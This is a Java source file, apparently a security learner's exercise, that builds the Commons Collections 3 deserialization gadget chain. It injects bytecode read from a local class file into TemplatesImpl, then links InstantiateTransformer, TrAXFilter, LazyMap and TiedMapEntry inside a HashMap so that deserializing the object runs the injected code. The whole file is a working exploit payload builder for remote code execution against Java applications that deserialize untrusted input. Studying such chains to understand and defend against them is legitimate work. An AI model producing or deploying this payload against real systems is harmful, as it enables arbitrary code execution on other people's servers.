package com.mechoy;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/31
 */
public class CC3Test3 {
    final static String path = "ser.bin";
    // 不使用ChainedTransformer
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes()};
        bytecodes.set(templates,b);

//        Field tfactory = templatesClass.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map,new ConstantTransformer("q"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, TrAXFilter.class);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"222");
        lazyMap.remove(TrAXFilter.class);

        Class aClass = LazyMap.class;
        Field factory = aClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,instantiateTransformer);

//        serialize(hashMap);
        deserialize();
    }


    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }

    public static byte[] classBytes() throws IOException {
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
